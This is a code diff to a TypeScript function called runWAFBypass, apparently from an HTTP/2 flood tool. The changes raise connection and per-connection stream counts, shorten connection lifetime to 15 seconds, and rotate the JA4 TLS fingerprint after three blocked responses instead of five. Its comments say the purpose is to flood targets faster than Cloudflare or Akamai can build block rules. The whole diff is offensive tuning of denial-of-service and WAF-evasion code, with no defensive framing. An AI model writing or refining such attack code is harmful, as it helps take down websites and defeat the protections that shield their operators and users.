@@ -2045,24 +2045,24 @@ async function runWAFBypass(
   const drainT    = Math.max(1, Math.floor(threads * 0.08));
   // Vector V (origin direct) uses primary slots once origin found
 
-  const NUM_PRIMARY = Math.min(primaryT * 5, 1500);
-  const NUM_SUBRES  = Math.min(subresT  * 4, 1200);
+  const NUM_PRIMARY = Math.min(primaryT * 6, 2000);  // ★ +33% more primary H2 connections
+  const NUM_SUBRES  = Math.min(subresT  * 5, 1500);  // ★ +25% subresource connections
   const NUM_CACHE   = Math.min(cacheT   * 4, 900);
   const NUM_SESSION = Math.min(sessionT * 3, 600);
   const NUM_DRAIN   = Math.min(drainT   * 4, 400);
-  const STREAMS_PER = Math.min(256, Math.max(32, primaryT * 2));
+  const STREAMS_PER = Math.min(512, Math.max(64, primaryT * 3)); // ★ 512 streams/conn (was 256)
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA4 Fingerprint Rotation ──
-  // 256 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA4
-  // profile (ciphers + ecdhCurve + minVersion). MAX_CONN_LIFE = 30s forces reconnect
-  // even on long-running idle connections → continuous JA3+JA4 fingerprint rotation.
-  // Cloudflare/Akamai fingerprint-based blocking can't keep up with full JA4 rotation.
-  // T002: Response-aware rotation — 5 consecutive 403/429 → immediate reconnect + fresh fingerprint.
-  const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA4
+  // 512 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA4
+  // profile (ciphers + ecdhCurve + minVersion). MAX_CONN_LIFE = 15s forces reconnect
+  // every 15s → aggressive fingerprint cycling. Cloudflare/Akamai can't build block
+  // rules fast enough when the fingerprint changes twice per minute per slot.
+  // T002: Response-aware rotation — 3 consecutive 403/429 → immediate JA4 rotation.
+  const MAX_CONN_LIFE_MS = 15_000; // ★ VECTOR VIII: 15s (was 30s) → 2× faster JA4 rotation
   const runPrimarySlot = async (tgt = target, s: AbortSignal = signal): Promise<void> => {
     const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar      = new Map<string, string>();
@@ -2106,7 +2106,7 @@ async function runWAFBypass(
                 const status = Number(resHdrs[":status"] ?? 0);
                 if (status === 403 || status === 429) {
                   consec4xx++;
-                  if (consec4xx >= 5 && !blocked) { // 5 blocks → force immediate JA4 rotation
+                  if (consec4xx >= 3 && !blocked) { // ★ 3 blocks → force immediate JA4 rotation (was 5)
                     blocked = true;
                     consec4xx = 0;
                     try { conn.destroy(); } catch { /**/ }
